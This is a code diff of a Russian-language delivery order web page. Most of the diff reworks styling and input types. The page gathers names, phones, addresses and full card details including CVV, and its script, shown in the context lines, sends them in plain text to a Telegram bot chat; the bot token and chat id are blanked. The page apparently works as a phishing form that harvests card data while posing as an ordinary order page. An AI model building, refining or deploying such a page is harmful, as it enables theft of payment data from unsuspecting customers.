@@ -5,130 +5,169 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Заказ</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-        }
+        /* Основные стили */
+body {
+    font-family: 'Arial', sans-serif;
+    background: linear-gradient(to bottom right, #74ebd5, #acb6e5);
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
 
-        .wrapper {
-            display: flex;
-            gap: 20px;
-            flex-direction: column;
-            align-items: center;
-        }
+/* Контейнер всего содержимого */
+.wrapper {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 20px;
+    width: 100%;
+    max-width: 600px;
+}
 
-        .container {
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 300px;
-        }
+/* Карточки ввода */
+.container {
+    background: #ffffff;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+    width: 100%;
+    transition: transform 0.2s;
+}
 
-        h2 {
-            text-align: center;
-        }
+/* Эффект "поднятия" карточки при наведении */
+.container:hover {
+    transform: translateY(-3px);
+}
 
-        input, select, button {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
-        }
+/* Заголовки */
+h2, h3 {
+    text-align: center;
+    color: #333;
+    font-weight: bold;
+}
 
-        .city-options {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 5px;
-        }
+/* Поля ввода и выпадающий список */
+input, select {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border: 2px solid #ccc;
+    border-radius: 5px;
+    font-size: 16px;
+    transition: border 0.2s;
+}
 
-        .city-options button {
-            flex: 1;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 10px;
-            background-color: #ccc;
-            cursor: pointer;
-            transition: 0.3s;
-        }
+/* При фокусе - выделение */
+input:focus, select:focus {
+    border: 2px solid #4CAF50;
+    outline: none;
+}
 
-        .city-options button.active {
-            background-color: #4a90e2;
-            color: white;
-        }
+/* Гибкая разметка доставки */
+.delivery-info {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+}
 
-        #customCity {
-            display: none;
-        }
+.delivery-info div {
+    flex: 1 1 100%;
+}
 
-        button:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-        }
+/* Стоимость заказа */
+.price-info {
+    display: flex;
+    justify-content: space-between;
+    font-size: 18px;
+    font-weight: bold;
+    color: #333;
+}
 
-        /* Модальное окно */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            justify-content: center;
-            align-items: center;
-        }
+/* Кнопка оплаты */
+button {
+    width: 100%;
+    padding: 15px;
+    background-color: #4CAF50;
+    color: white;
+    font-size: 18px;
+    font-weight: bold;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: background 0.3s;
+}
 
-        .modal-content {
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            width: 300px;
-        }
+/* Отключенная кнопка */
+button:disabled {
+    background-color: #ccc;
+    cursor: not-allowed;
+}
 
-        .modal input {
-            margin-bottom: 10px;
-        }
+/* Анимация при наведении */
+button:hover:not(:disabled) {
+    background-color: #388E3C;
+}
 
-        .modal button {
-            background-color: #4a90e2;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
+/* Медиа-запросы для мобильных устройств */
+@media (max-width: 480px) {
+    body {
+        padding: 15px;
+    }
 
-        /* Flexbox для выравнивания элементов рядом */
-        .delivery-info {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
+    .container {
+        padding: 15px;
+    }
 
-        .delivery-info div {
-            flex: 1 1 100%; /* Это позволит каждому элементу занимать всю ширину на маленьких экранах */
-        }
+    input, select, button {
+        font-size: 14px;
+        padding: 10px;
+    }
 
-        .delivery-info input,
-        .delivery-info select {
-            width: auto;
-            flex: 1;
-        }
+    .price-info {
+        font-size: 16px;
+    }
 
-        .price-info {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-            justify-content: space-between;
-        }
+    .delivery-info {
+        flex-direction: column;
+    }
+}
+
+/* Модальное окно */
+.modal {
+    display: none; /* По умолчанию скрыто */
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5);
+    justify-content: center;
+    align-items: center;
+}
+
+/* Контент модального окна */
+.modal-content {
+    background: white;
+    padding: 20px;
+    border-radius: 10px;
+    width: 90%;
+    max-width: 400px;
+    text-align: center;
+}
+
+/* Кнопка в модальном окне */
+.modal button {
+    background-color: #4a90e2;
+    color: white;
+    border: none;
+    padding: 10px;
+    cursor: pointer;
+    width: 100%;
+}
+
 
     </style>
 </head>
@@ -137,13 +176,13 @@
         <div class="container">
             <h2>Введите данные для доставки</h2>
             <input type="text" id="senderName" placeholder="Отправитель" required>
-            <input type="text" id="senderPhone" placeholder="Телефон отправителя" required>
+            <input type="number" id="senderPhone" placeholder="Телефон отправителя" required>
             <input type="text" id="receiverName" placeholder="Получатель" required>
-            <input type="text" id="receiverPhone" placeholder="Телефон получателя" required>
+            <input type="number" id="receiverPhone" placeholder="Телефон получателя" required>
             <input type="text" id="street" placeholder="Улица" required>
-            <input type="text" id="house" placeholder="Дом" required>
-            <input type="text" id="apartment" placeholder="Квартира" required>
-            <input type="text" id="floor" placeholder="Этаж" required>
+            <input type="number" id="house" placeholder="Дом" required>
+            <input type="number" id="apartment" placeholder="Квартира" required>
+            <input type="number" id="floor" placeholder="Этаж" required>
         </div>
 
         <!-- Город и информация о доставке -->
@@ -198,9 +237,9 @@
         <div class="modal" id="cardModal">
             <div class="modal-content">
                 <h2>Данные для оплаты</h2>
-                <input type="text" id="cardNumber" placeholder="Номер карты" required>
-                <input type="text" id="cardExpiry" placeholder="Дата истечения (MM/YY)" required>
-                <input type="text" id="cardCvv" placeholder="CVV" required>
+                <input type="number" id="cardNumber" maxlength="16" placeholder="Номер карты" required>
+                <input type="number" id="cardExpiry" maxlength="4" placeholder="Дата истечения (MM/YY)" required>
+                <input type="number" id="cardCvv" maxlength="3" placeholder="CVV" required>
                 <button id="submitPayment">Отправить</button>
             </div>
         </div>
@@ -325,8 +364,8 @@
                     Дата истечения: ${cardExpiry}
                     CVV: ${cardCvv}`;
 
-                const token = "//токен бота";
-                const chatId = "//id чата";
+                const token = "";
+                const chatId = "";
 
                 fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                     .then(response => {
@@ -345,3 +384,4 @@
     </script>
 </body>
 </html>
+
